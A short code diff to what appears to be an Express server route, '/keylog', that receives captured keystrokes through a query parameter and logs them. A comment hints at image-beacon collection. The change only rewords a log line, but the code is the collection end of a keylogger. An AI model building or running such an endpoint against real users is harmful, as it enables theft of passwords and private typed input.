@@ -15,7 +15,7 @@ app.get('/keylog', logKeys);
 
 function logKeys(req, res) {
 	var k = req.query.k;
-	console.log('keys', k);
+	console.log('got keys:  ' + k);
 	// TODO: send real image
 	res.send('');
 }
